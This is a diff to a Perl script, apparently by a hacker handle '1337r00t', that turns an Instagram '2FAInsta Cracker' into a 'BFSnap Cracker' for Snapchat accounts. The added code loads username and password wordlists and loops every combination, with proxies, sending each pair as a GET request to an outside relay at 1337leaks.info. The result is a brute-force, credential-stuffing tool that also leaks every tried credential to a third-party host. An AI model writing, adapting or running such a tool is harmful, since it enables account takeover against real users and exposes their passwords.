@@ -15,7 +15,7 @@ print '
 \n';
 print qq(
 #============================#
-#     2FAInsta Cracker       #
+#      BFSnap Cracker        #
 #     C0ded by 1337r00t      #
 #    Instagram: 1337r00t     #
 #============================#\n
@@ -26,53 +26,62 @@ system('cls');
 #######################################################################################
 if ($do == 1){
 	print qq(
-	Enter Proxys File:
+	Enter Usernames File:
+	> );
+	$userlist=<STDIN>;
+	chomp($userlist);
+	open (USERFILE, "<$userlist") || die "[-] Can't Found The List Of Usernames !";
+	@USERS = <USERFILE>;
+	close USERFILE;
+	
+	print qq(
+	Enter Passwords File :
+	> );
+	$passlist=<STDIN>;
+	chomp($passlist);
+	open (PASSFILE, "<$passlist") || die "[-] Can't Found The List Of Passwords !";
+	@PASSS = <PASSFILE>;
+	close PASSFILE;
+	
+	print qq(
+	Enter Proxys File :
 	> );
 	$proxylist=<STDIN>;
 	chomp($proxylist);
-	open (PROXYFILE, "<$proxylist") || die "[-] Can't Found The List Of Proxys !";
-	@PROXYS = <PROXYFILE>;
-	close PROXYFILE;
-	
-	print qq(
-	Enter Username :
-	> );
-	$user=<STDIN>;
-	chomp($user);
-	
-	print qq(
-	Enter Password :
-	> );
-	$pass=<STDIN>;
-	chomp($pass);
 	######################
-		foreach $proxy (@PROXYS) {
+		foreach $user (@USERS) {
+		chomp $user;
+		foreach $pass (@PASSS) {
+		chomp $pass;
+		foreach $proxy (@PROXY) {
 		chomp $proxy;
 			$ua = LWP::UserAgent->new();
-			$request = HTTP::Request->new(GET => "http://www.mughniagent.co.uk/snapchat/proxy.php?username=$user&password=$pass&proxy=$proxy");
+			$request = HTTP::Request->new(GET => "http://1337leaks.info/tools/snapchat/proxy.php?username=$user&password=$pass&proxy=$proxy");
 			$response = $ua->request($request);
 			$output = $response->content();
 			print "$output\n";
+		}
+		}
 		}
 }
 ##################################################################################
 if ($do == 2){
 
 print qq(
-Enter Username :
+Enter Usernames File :
 > );
 $user2=<STDIN>;
 chomp($user2);
-open (USERFILE2, "<$user2") || die "[-] Can't Found The List Of Codes !";
+open (USERFILE2, "<$user2") || die "[-] Can't Found The List Of Usernames !";
 @USER2 = <USERFILE2>;
 close USERFILE2;
 
 print qq(
-Enter Password :
+Enter Passwords File :
 > );
 $pass2=<STDIN>;
 chomp($pass2);
-open (PASSFILE2, "<$pass2") || die "[-] Can't Found The List Of Codes !";
+open (PASSFILE2, "<$pass2") || die "[-] Can't Found The List Of Passwords !";
 @PASS2 = <PASSFILE2>;
 close PASSFILE2;
 
@@ -82,7 +91,7 @@ chomp $username2;
 foreach $password2 (@USER2) {
 chomp $password2;
 	$ua2 = LWP::UserAgent->new();
-	$request2 = HTTP::Request->new(GET => "http://www.mughniagent.co.uk/snapchat/proxy.php?username=$password2&password=$username2");
+	$request2 = HTTP::Request->new(GET => "http://1337leaks.info/tools/snapchat/unproxy.php?username=$password2&password=$username2");
 	$response2 = $ua2->request($request2);
 	$output2 = $response2->content();
 	print "$output2\n";
